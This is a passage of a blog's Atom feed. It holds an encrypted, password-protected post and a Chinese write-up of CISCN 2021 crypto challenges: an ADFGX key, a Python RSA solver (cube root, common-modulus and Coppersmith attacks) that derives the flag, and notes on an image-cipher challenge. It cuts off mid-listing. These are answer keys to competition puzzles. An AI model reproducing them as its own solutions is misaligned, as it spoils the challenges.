f34f18f80fee01c66d3e6bf6ebbb31b41e3a841aac21863025ffbc84cd93ff2af801e968404524fdef3279957859a6dacac711c4826d934ca4fd8adf3fa2a6b652e9c0738628017231ba60c5b54468627971e40a76a8dccdd548968c22c7a8288f1bf315a013b15c5de764900f59855c169e4ccce136ce61b34a3e211a632d432bac70cc0e74bcfd537f5ed956b399761289f1600224dce9bf91f42456ea32ef24a1fd25e376ba47c823f90398026c4d5a09f6ef9615d65d04cb5fc3d2cfb7a31d2e6be233eef8379d218e8ebfdbd1295e4e564b2d8e433877c9098baf45206744d842f374869077d68e6c12676b1c6003eac7714326460ab6042ba27b0ed14c8836322079673a3b3d1b2b8dcbbc16a018d3434b9bf3a988ab2c2094a1c6cc05cd23bad4d25d40d5ec0e17ef2924715d8f796ba913d4487b717702eb498a7ef7e0901a9a2fa1a29d810391b5b30ae1ac81a595e5a8d9780de7837b18d2cbab8e6923072e8ed20745d78289011fd9c5a221b3fac4b5400ad14751cd9b2fd8d8fcfa16b6ebaa5c99e9e765329b4a7438c9556cf702a741afffa64a6f861368eda40b0f3f63a39bea2ff158a05a354ece773e472b4088848ef54668e4f114dd0a68b60f0869016db0f83be21a169e0c323792bbc49bd64ccc16c4d79ea425d4a1ce11c9466e0ad5bc398b2502f34499446d14a772747be4a2518a2dc1f8f20b8601973dba6e37ad637288e10b36c121687a49568d4f8c7ba70c76a8232e8a9583fa6ce0e47db953e0273ae6f1fd3b2542749b854656eac784238deabc07ec618ba39e6c68a828d0461ad71204439f67d1f8842bcb8d5b5aef683714f9f35c2320e500984a3b713637628ce5400f154bd9d6b07b0998c99987c8255a8e4b23e01facf02abecca453b986e1bebf05a010e147031e5d128295eb536b87f4b1c1f408b3e7803406a206eb1b921e31afe38c8573c308e8f69a2b7858eb6b3eecb5eb273dc1b95b06c31e689af9da81f5755d0049d17214672f94af896b88a77719d6825412d4656b8f2f7638930dc46b70977815e7154c26ce83423b22c19b47142df2abc73ee12d3ac5be04e8214d316ece3d6b1daa453e2dee54a3b3d94fbe2c9d05c8f006f46c6536bf62e52b4028590d362ac0c96b92f5f0707da9bc7392e051f116bc54e8a1da2bd58fea8c6dc5cc056781bd9f8328efd2e1d26cc9e75a3c5fb0f186587511d89c1dde454cb09eb3df8e1f5e82af1f595c369f414b22874049118b29b5c1d4a1d8a37d5b23cc134de462d9c875fc80df31b418b1e91c58791435706462c7f55eb4f80f8034ca51ab5dc771d5f91d88f1fc4118307f825a9ec6817787525de0294670c4737b14ecb8959e32d736ed5a3f369528d5fb3468878dadcc46f6b711b9e72b06d4573d09fbed2de82535ea7045bb40fb69089340e13685b7b860acb967507107efbe32018b709d1ca0acfe63414461cc39b491952b356f738a289415d283b46cf1e7e27e509d79c2df55f918837b7f3917c4c3412f92ef8179b68bb4f298ecb50d0be2cd080382f716ba86d502dd5785d7fdf595535df3c6f2de3349c4404c151ab165df98493a4e5d7d3307a2ccce0dc0f5d48910598464fd3778fc2cc5df98d587648702693662bd555b30d5764a73ed7d663462d44c1806ff456ae28538ec0a40dd3524b86d9973870f058f0c80333a992d0b6e884b5ceda2ccd388adf1db268b98a6144bb1b67fe50f4f400085293658464fab36bb32e140f21f2b8011695a4c9700072593aa509d1f8eae111d2910193bfc22fd7fe7224f5a1a45475b4c530d3b7d57966821204320fac221d2ce5830439a17a6c58aceb02de51e92c9bbc94f980a2f8da2eb8875908ec13b59e12501a06562ccb3fc2b4cfc3f8806ad9c20b4f90de99c0abff913095c729d82ea1251b7c78ff27917e004e007b82ab3218bcac869144329097576d7f60f2150c2fb1525d0f864d46539c8617ce7004d97b5d9361a25463778275aca3ddb4fc12884262b4832689cf610f962622555186690843062b91560d9cb7ec0229f5a90fb907a47b8d3710f95e4f801ba7905278d4f839350252df4920e44e6ae952257a418e77b4bc5377883f02a26cff815325a46c146a2ef99fbaac9ae44f10f6084494fad972d1188e11de34bc94c1d6d9058e17a8558986702041610c8e145a30a39776784d753972f340c4108388baacfe156f1fe5578b4257175d4227de6e17bab916821ec5cbd5b2cdf49565ded7cd39ebfabff0dc5371d852555e47263b1e7cbd15b7cac118fbac16bfc2ab24353fb85e171f9d812b4607fc6ca9eabe7dd5efed995c358bbd5e4dacdd3714a8448911d70470f412041d3274fc2f2e6d524fe4677f9715fe7d4aac45de82bfb52bfb5d98654b05ee8e794a5f1fce79b71960d1d2054d12bc0c240c3f61fe49375895dd8fe153c54a5b88ab739014039fc2884d02ed8effa9325b78138d04866862ad26e50ad2510dde88d8f6c0d4bb4e8ff9e8c94b2ef23c7eed2e282fe00b9557e824e3d4d0861f322354bf59246acfe94c0caf2fc9a873d3258239f21a4654f456e286c273f6abd3a6ce737799982c2dfa6680f06e1a5eaae68c9501b71c9585dd491aeabbfb1ae921a6ee4873d819e18b7930662d4d64c7380553d2e5c4f08982103bc746af16285239df113def75b4631d6ab4c33938ad6eebde49f29a0fadac33580bf381000b60f185572efeff324804a978616288c71fba3de78d1d84243b34294d39903b7b1e872388353daa5c10ac6784ec87d3c70a8f1213a5ba266cc22e9a66eb4bfac0a81ef5ea1ba8ec3e688364fc22b9348293b9cccfa882c0ff15f79bb581c973f6be744ed258960a50ead9c5fc43af2f05d568beb0a1bd5b859899b12cb690b50a8098f0570249b1e5f1955a37eaadd1a12a87e94c45c2620a8053d86e86c7785c354c84c7a2c7a7fcd79a2185bbc2ebd502cb5a5c114b922faf9f61409e5ded4fceeece6b7fbfc47de3b637333b7b9cfc1be8a0e78f72af50aa789cee2b7a5530cd81abbac28cad59e9a1c5b19173e9c38b6d2891364dbb7e842235738beeb27134fd6770ed212a3f33e711eac0deca5c9130568d7ab6cec22d3febc5c88605c5a51844eda46bf292c8406c7e888fc81b6b2aea47e7ad3117c7e124b3d92037b8a8a689e6c403eeda7a946313c2d0aa2abe6aea71bf5d3496a18fc2fb2ca4cf2d05f3855bca27bf23279a9c4993c370b57e60160ba1a69caea39060c01ce58105d59072142edebf09e7d2bb291e8322801ccb07eb9115c5d006dd5f5ea43735963729582109fa869d659ab0f1c884ee4056f9594997745310ceeb1d6d11cd99ee06924bc04249a08f7edb9f4c3a0ead4f616f857c335e6ce51f17b4c51c671da59588917b4ccd8f39fa29f98da6931bb04c1eedd6667136ae1400e75ac33a9bfbb9ddda1b5fd3d9357e0e9723e0e9aad7762605a705837615ae3956b3cfe41ef52716e0859d53ddcabb354cf9b0f665ef43b5e16db8bbc8a3b10a6daa12034e06b0fc7ddcff02d95f0133ddfaff7da610dd3548b9237e4a74961f5e86f0745f7593bedd13dbe1cb31e684d601a21b9020befb2d18eb994ad132c5e5f493a4d2442ae19167a84809221caa42f184f8427659ec0f9498c968394696a86966eaf634fa6df32d94d061b3360fbeef3ba582c1929be0888df92aa3216ea59b22d4b2aa1e7a6b53b25a843a29f2f8cee15561bbcc4705949030afcf6969b44cf373d475e94d51cf37409eecc7f8431f70613906252043d2b32ab9680977268eb6da48e8eddf1afdacafe81904cdd0e887fc69937fc7ab8776e1ba629e32781ed9ec90e8d0ef4d320b9ae2a278c6662b594a346e4fa4601b618ba84e4c4fdaefb2f8a24af67fce80b4b29ffe73c0fe3880050f91c5f27d32261a2fb6a8114afa7f909fb2f2210f04b43713fc6e0e5ecd184742b5c6db773a7832380a8ed69569b7d445c26af567fcf13e27b6ef64f058e3cc600bd40fdd34db471cb148c66b4310f775a362109b1f808b842fd95ea9e914d97d122d7f9946cbedb5a7e67fae3809a38b1806ba6ba345efa2af8c7b11444d86a5bcb41bad362d73c1202840de3890b271d8acecf2332de1119789eceb4b8eed9ae8e883deb168636254cb0eb0d603f4349e35d1ac1fc378234601e47b6185bb4afe28a06e80b82c97d3d1958fccb6a469891e1343894a6b5d4332bc878ba3ee07b04ccca7587d6001b49af461b4e6df123f4757753e9165edffd3af4145483752b6a405e355fbd9193c59f06941dd0807260971cba3fded1436b4db8ace700a45c9bcfdc8adc7d5a1348b914918ad0bf6fa305d1d0c299fd97147d3f85cce48d8bc7566daf759fec238026333dfe5d34b52747737d0b94057967752e35cab0da0945ca464c9f20c1a276d8e41eb99682eae21b182cbe8b8f3ec639945ede47cd675f2a6a070fcd943330c52d2df7cf1c7b86ac7b2b3903cb4e0a9a631a5c5282e1ad674f44786281b8c2fecefe680a15f0511b1cac1f3775ee209ad8ea163c365171ea2e12ed44fde52ee4292364ceb26753d9382fb38065a9d4f47dc23a61b3d86d803c178143837c9353d6540d1177e563ec741ad04492fb5fb0c98c44ff75c06a6ddc5877b1c71bf5d9981269869f5e1b052399da5f706dcd9062b02a3ce4a36f65f6095cd813f5e71ce6a90a174834bf3c09373049b0be3ee49d7ad0f7ef1cb718d2d2018e3ddee27ab9d339b24076b783933cb0fd8987fd4997e14bb611461b2d2bdd2f05e84677c90665d65836ee7bc3150b540820576a243f04fb09a94892e97e03d2f9abaee48aa6bf43e2fd248f3386b8aebb7bcf9adba25fb8f93a21c82190036ceeb278b667ace5055a6cdffbde115111751808c43795e9e1942849b86b2651b2538f8904daf5768ef8bacac5b58b04fb9311327e19b10bf97d6a6eaec720ccb39ce8f8e9825322dc14e8afea7423d6874e726f7d9de3cee224f0e14f09c52bb60dad4273afe33aa444d5c23aa6fb5d77023da239ac1613127d1ab5310f484fe59867f3ababf1403a96f371f2a498c68cfff35eed140992457c272d58371378d97351ac57386fb265c5fa5066deab987fe22f1d4d77ec448932ea34024d95d82efba2ef7015f0cd865eeb59c645afb769f05e7800b5b35d981bc347001fe53da58af6465659086c7d9c0258351175dcf83f095cb7fdc48a6e7ee24e313ad44cd5f56c2341c388907b5962e0af286ca8b7d71000702ae519782ef61a6fa76edc92ad280b42a3a65c84cb4ad977998d7e974307416b20df78fe63f26d4696fe3eb5aa5451d4905a2e4a0120f66377caafb965f88aa1bc9127001085e7d87b9f8fb624e504f366fc3aa208e5730403c2c611b1f3972c35b63adb8005791fe07e320e7ede007d13d5a2339d3486aab86f1579facf3594308814e4cdb447922e799e3edb31136cc63a05e24e0bf2d793a27bce29da9c6f58f668b695f3bcad922f6d40a61fb60e63c9c7a8051618f06a650ddd6b04b8319c7660ae2910529e81cb87536555f24e949eb525ef4d9fce44f8340ffa5353514e3f0f1852b90a8f506d5f66d95db8f528c7d82af1b5ae638c1f28f0b13b6318e1a1fb63c4cc21a5f21d0dd00cd233ee453f35ecfac3f91b79dffdaa8d799dc8471cc34987f89342993257ea389f197107809b692a9eeb7ffbfc25b92ba37cc952aa467cd66da5ec24ddebeb943c3bc14183e17153593a33907fddf2d621f00cbae1b2206a7521a8c16fab4bea4b52c6ccebc6d3d0975e69fa391f5a07e06bc3899755334c139b8629e41298a03d98f9ba4b1b56175d608123d57f2704d51e8a741424722ed5ff5dea1e2687e9ac92bda104fa2e0b28496935a713dbe333de67785e069f1f44f291bc5decd4f2dc0ee63d9b18c3f97e39539bd7729d5fb4cf64f77b3609232930e9efc12a77cacba0ac6cc82b4b20451583ead358bec16022560cf50f847a7e223c06e6b44177cca8289ae4726ab2a501d28d179e2af9837e74f142372f37ddf8847a322a5ad67f5c6ede68db210cda9156338ec0dfe0bbbd1a412f7a50ae229fcef31702baaee7bb00e4eeb8bdf7179aec7462fe2178532b81a66ebb705f9fa9f634c184b2790a0b4a6495c20a985d015d37e4730450b57d38d331de51dc8ecd738eb83d967c72c100d9914ee9dbef7770f9da22076ecb05759aade275da862c6b604503717cb811742b88f2dad1cd1f1089ea71a822e64b25528d18b35c968a248556ea2cef61f94daf0f15220b9e77437ca11a72c051717a0255d8910ef482221dc4e15e1acf2faf27dbb153418169ac6a61d8cecc2eecedb4023c6277dfc63e670229cac963983e878e8144c969c27f39613561bb40a7a270e1d864db887951ea5496031fba3fcb9d956230e50359c890833d152cc751a5283bd74da11d1bcd169642ba9761d39748a45d4a294825c1bcb092236266f870a344c9c365d6d246407c2320195ff706743f96b0a7d42cdfbe33ed6d90f4a9a459ac2b04c7d279e2d0f4f857b0568773d7712acbb91e842d492b567603bd14eb4af1adb852aac3127196cee722c821cf07d30720d91c6596559f4c09196223e4b9f40b8a0792dc502a934e06f8e062c0ef586a38e9861f643a30c1bb570d09f1a61edc9966fb101b6745eac8a1ec24a1baefb563df9549fdd33d263112ce9b7582dd7e8151d6a6aaec46f2c8dd83a868fda1023ae184a7e0ad8c901ac14af03121310ba07a1ba2dc6c8f4740c423abb5883ce752aed6c8743aa43a85e1ccc92c8b38281455c93e37176e265f3252b6b0dcbcb5277b95132925c847979648f661cf6fc00c7f3a3544af12bf3528afa1c3ad2ed50ea915d3d1c7d53d72559428d282858df581e231dd6c6c96a85eafc703535eb0d0bcd1b6e8964996f52525e430e46e20ed1591cddfd204ac8144455cef335d5a49f1eb69ccc7308ccc296cb22dc4115dc99ea1e25357e88f6b0f5e3f8328bce64771d91a5dbd4b6fcc363fd9db5eb4e71687b17b5027c8c5da4a0450ae10859d7d3e61bcc0739822615a3fca0aba0d98486b785841b2c25c3339380b42034fe9c7ad2472e3f70d6248df9a53d93eeaadc0fa5cd234c7dafafe2d401d9a43bdb0e2c07663f16929b8f0897724d86618fa7797711bbd6e4d493e7da32d2286cb155967bd219437d00238110920d0f77dd69df964982564831e6863cc78b6532a2a43d6e720aa269a2bddd51d550ee753bd22c532b59b776e5e896375e7512c2e723e24db1dfeb7add2199869e7e7ddce7feae47c0306d44cf77f7a0427e2149bb3c400bb50d3e1f0a914eae9d725659db63ad060cdc277c7eda85bb2fb1e12c06c67625f638b877e2453768d04cd9b0eb5536812f808267407ca9d394deec33773e627d05f2ead90cccb5329f06cec6028b0d9808d4df76191a43555fb37efdb4e70c805d295948177da571d00ba05af06e0d0e63b43db1ff854c96e6d390b9449238fcd721fe7fd54cfb7a9ff7f9fb6c8777087ef4a1ecf32a5f710676fa32a9264f919f302b3a6c7ad8f29031a6900fc5a69a4f926670ff6ed71f172d0b86fa18114bbc6093dd5aa367d55c43648d90ebabf0e74ae30c9c2537e008c0f64dc2d983387f5d1aec41aa829a5629b6b786bfa1a338681a10bf1173cca45f00755a7fce0e9b5f6793a00106175720d4566a0043bddbc463bd6670964ec9c7610e04fd5271317b4e654a2d12e621740e99ac89dd805210bdfecf99222e5744ba264b060512effd675862929ed2790e6c1e9bcb66aa3af35f1f14c667b66323dc67286211e1ce0868131ca7620c9d43ca1b3122c6a00dfcce95531a3c200f3439667eb910642fe23d6386c52409711237f9038f7680818f801a774152c2196c6e0f4de0a6084c01d00243ec6dbc274429f67da12246f66ae2efc138c14d858e725e76682cb484a8b5edf4dd2fbd5a83da3c42a5cda6d5071f06b36ed2af1d49bc813b2e3a5f817acc4a8fb87cf928a2c8b90f05ff252a42efd0fd23a080d7eb7a8e1d3e9b4c24064d3ad899d60d4e713420a4d823d48be42bd89898fbe07f800b610ed7d45f5dd94dc08f2dd3ad96ca4b053e2a115601165602086dd0a6c454574c86f8ef38287a42773beeedc950d958fd2f2e51147426d1c6b0574cbcadd876dd12e8bcdaaf7b05421f405305e68d683c42b968b85f6b6af645761b6364d45e0204d7133c37c2ad96c2e27d95e70af362ae040a50263129c4bead98abed80ee02d5259d4772e4c23128b465a569f1d0597987918a634fb12acb0b9e53f3fd61590bd5db434dfe4eac211972d62c788ee3e7d0cd62cfd3d38829554a33a1aa6dbef8930fede7225a2bb7892ce57a32360795090f34dde1eeeffc26bb09a2ceed264cb18b2539913de73d0034593a31146db566f7e0b8f2fb6348c34ca176801207dad598ba0741b352616af8020fb4ab064e775e2b8f6d5ccfb03ff22893b326613edc2fcdf629a3cf22288ca9aaa0201be4db7253818231355a42e08cea742029dcfbb2f68f7ad36c67be1c0b591172dce6a9048352221e81d43b7f0f8fea5ed17542b6ee704ce7d153fa39d91042e058bca60712544361d596f6e42b1737bc5574d5124fcf0853df657ce3893ff5ead6480d22317c121a788825aa6e39d705f48ada02ee400eaa6bda3c0c63cc9e602d7b9f8dcc757c73c8d1f630b6743d2fe57100093b51393f62043b6df3615f4d2855cfc6f4d8d154471ce25def5e565642b0d948c6e13ab7bef0c143f9ee8f43abc92f6527d1f10532bd4c07c4566e16827d6b946b5062882b3d0397ecd073416d9f12c8574dff3a538ca75d7119ace3ab0f8b74e40abe179a389a593d3aa9955799a53214fd0d9c4c25024cb60b77a72c7f6a019d1e4c22413c53eaa332889c974629965bf8e3b9cd3164fdc671b4c59893463a47ae04c36e2982e28f2d81331678fee9a51beba02a8a2da2b56de49572f0a023f66f6daaecfc4f407ed6ab697d9a1b3c56d492d42a869991152de5060b9b59bd26797c26a4201c6c6e3d3a947faeae51f159edc197df417b756d6b019511eb682a8ab37ccee8280f2686d7ced5f1d0b692279492e420c42dbc5b886f190b94ea8f701b8e4e597c8b69f475296e573fe74303e2c213bd615258ceee6fe84a31434d5339cc2a161d71031bb8608e238a67dd96c8cbc0ed2a451c7f95b45e6ffe2ba937edc2a2bffb889eabdeb12632cb46682de02b777e14efbe3d204928d2f16f786074bf2af560d861e303b819511c5f8599fdd3fcc8e238b956789ec58a93cdc51b1de2f818d8b899162d39fbe5e35c8de5620ee886a3152d4e2569c651da33acce310af49c7eaabee667b051c738c7b50eee04a84ee6c6d42b0922684fcf09fe30ed5326e173c49b8ae875195cb535e06ca26c0d1183b0bcfdab9d1080b83ec2901611125441e115e9f2e139308a8fb717c9b72ee6f8475de641af5a7b2b6444bfbc3aac549c59e42fa6fe53115f24a964d6caa85377da685651e8b21d9d45b2529f4114f8be5bfa699cfb2dcb8060567782637fd46ffe14b852942c018ee2bb9fb61bf9bb73c501315d0116a0c9ae708068546531715277ed39dafe5ed2f991ce6668c51a2b426b1a586395d20dc7bd7c28270e79d81496a230d372cbb5a9c0b3bc2fecbaaec9f06664907581b4ca1b331fa28b8dd474f975a4bb677afae440c23a32690d82b22fc71ad8b27d4be8f97a78130a3dc50bb5b3b17c75fc82a79c6d24fb12c91d23b9735a74e5b21418fb93c934eb65b64bcf6c93d97e5dd5c562bba165465872008237ab1aa8ddabcd7b3f3630cb744af048228bb88fae3cab063dc503f55e1e1b9b526547d49b85595c97e9b9033e82df99188712bf3ae7e275c6b0324bf56e2e6ae2938499570ba25835b71a65ee92fb34297723abcc89e98126ad45af088367f7cdbe6fe5b1ce14b310b6a8fc9e9ea50db78926c479f54a5ee9f37282df5e08c10bcd85463b2913fc7c9cc980f0e3613f169b3d811f45b5d122e972a7ce057c509b9fbb308548a38e4f3cc53fd390515387ff33fdd0feaa44eb52a5ea301d36221d801f0e542ecc8beb2c30466f9ac3f0841c605ce8a833479d1686221ad89df3ecf167eb97882f303a3f6729cca3abdde636c7061f7c04d2a56e1b5be0e843b81322b26266e9bda54e9adeaf41a6e5ff930d67253883cfeda0526a74c48e0c0981e2fc25655cd56b8d1a7f20f0c1c3dff5b313b45dddf4dfe37f1a4bccc51dc44347aa1141e143d0c0a4c1f3de3572f44c035bc101268a76ba364f281ad201bf36e42fdab38b3ce31916c8e2e9c59e76569e17611537ab2613b5559d44fff50ef0efa0a74f20bc50eb6eccf08c04aa248b668004e8dafc5074da4e12102138611f3eba552a716cac28ea13d360a2f2acc02480aab729a7671a511f975ae0deff4fe6408135e623890402f4088f3ffd82ca268b6ffb9ac92907068fd9afc8a1f0a1cdcc1f87c9fcb69867f3a28f807a911a70778e617ffcd5cecf87d8a3d1f17550c3ac5efe34127a8a3e178a417381b16db8df7c16bde5f2c48595974afbe1cb075889a9b9adf95db03122f067aea8cd07254bfae9cbb33f9da09fa3f14a6271e68f48834d861d22f145a62c8d71eff4247fe0948c5f1e1a3f3717f80ad8c1536c4dac3b0e41f944b3f4e3c6f81e888e3599bb1ddb953d84a18a6b004be407077d53041a8a55d4dc4e74d49a825667bf22c80ad074687d5f15bc65aac72446bf84d3f463bf1d912bfcacf107e44ec38903c2e0d708521ee33f72c4341ea0b63c298b32ebe81359b3b9a56aed02a5897ee7477b0d9d53a85b808e93f03d6992c0d9a6e9c967f415db5be91162df741ce0f1e15733525fff5520db3657d4267c734a4515121d1843042a452c7041c4f2c2d8a36b7</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Please enter password to read.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Please enter password to read.</summary>
    
    
    
    <category term="AWD" scheme="http://example.com/categories/AWD/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="AWD" scheme="http://example.com/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>First AWD at ciscn2021</title>
    <link href="http://example.com/2021/06/20/Frist_AWD_at_ciscn2021/"/>
    <id>http://example.com/2021/06/20/Frist_AWD_at_ciscn2021/</id>
    <published>2021-06-20T04:51:30.000Z</published>
    <updated>2021-06-20T06:39:24.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="祭第一次国赛-第一次AWD"><a href="#祭第一次国赛-第一次AWD" class="headerlink" title="祭第一次国赛/第一次AWD"></a>祭第一次国赛/第一次AWD</h1><p>华东北太卷啦太卷啦</p><h2 id="线上初赛"><a href="#线上初赛" class="headerlink" title="线上初赛"></a>线上初赛</h2><p>360搁这给我高考呢是不，一卷二卷三卷发来发去收来收去的，非要让人肝到凌晨三点</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="classic"><a href="#classic" class="headerlink" title="classic"></a>classic</h4><p>谜语人给爷死</p><ul><li>ADFGX密码</li><li>表<code>phqgmeaynofdxkrcvszwbutil</code></li><li>key <code>classic</code></li><li>密文反过来</li></ul><h4 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h4><p>Level1<code>e=3</code>，Level2<code>exgcd</code>，Level3<code>coppersmith</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span></span><br><span class="line">n1 = <span class="number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span></span><br><span class="line">e1 = <span class="number">3</span></span><br><span class="line">m1 = iroot(c1,e1)[<span class="number">0</span>]</span><br><span class="line">msg1 = long_to_bytes(m1)</span><br><span class="line">print(msg1)</span><br><span class="line"></span><br><span class="line">n2 = <span class="number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span></span><br><span class="line">e2 = <span class="number">17</span></span><br><span class="line">e3 = <span class="number">65537</span></span><br><span class="line">c2 = <span class="number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span></span><br><span class="line">c3 = <span class="number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span></span><br><span class="line">gcd,a,b = gcdext(e2,e3)</span><br><span class="line"><span class="keyword">if</span>(a &lt; <span class="number">0</span>):</span><br><span class="line">    c2 = inverse(c2,n2)</span><br><span class="line">    a = -a</span><br><span class="line"><span class="keyword">if</span>(b &lt; <span class="number">0</span>):</span><br><span class="line">    c3 = inverse(c3,n2)</span><br><span class="line">    b = -b</span><br><span class="line">m2 = pow(c2,a,n2) * pow(c3,b,n2) % n2</span><br><span class="line">msg2 = long_to_bytes(m2)</span><br><span class="line">print(msg2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span></span><br><span class="line"><span class="string">p0 = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902&lt;&lt;200</span></span><br><span class="line"><span class="string">kbits = 200</span></span><br><span class="line"><span class="string">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="string">f = x + p0</span></span><br><span class="line"><span class="string">f = f.monic()</span></span><br><span class="line"><span class="string">x0 = f.small_roots(X=2^kbits, beta=0.4)[0]</span></span><br><span class="line"><span class="string">p = x0 + p0</span></span><br><span class="line"><span class="string">print(p)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">c3 = <span class="number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span></span><br><span class="line">n3 = <span class="number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span></span><br><span class="line">p3 = <span class="number">11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423</span></span><br><span class="line">q3 = n3 // p3</span><br><span class="line"><span class="keyword">assert</span> p3*q3 == n3</span><br><span class="line">phi3 = (p3<span class="number">-1</span>) * (q3<span class="number">-1</span>)</span><br><span class="line">d3 = inverse(e3,phi3)</span><br><span class="line">m3 = pow(c3,d3,n3)</span><br><span class="line">msg3 = long_to_bytes(m3)</span><br><span class="line">print(msg3)</span><br><span class="line"></span><br><span class="line">msg = msg1 + msg2 + msg3</span><br><span class="line">flag = <span class="string">&quot;CISCN&#123;&quot;</span>+(md5(msg).hexdigest())+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="imageencrypt"><a href="#imageencrypt" class="headerlink" title="imageencrypt"></a>imageencrypt</h4><p>首先因为<code>a^b=~a^~b</code>，用两个cipher和一个simple求出plain的前256位，接着再用一组对应的明文和密文求出key的可能配对还原出还原出bins之后去算xlist，接着算r，找到差距最小的基本上就是r的取值了由于精度损失，我们如果得到准确的x值较为困难，所以选择爆破x0，key1 key2 x0 r都已知，对cipher2再加密一次即可得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 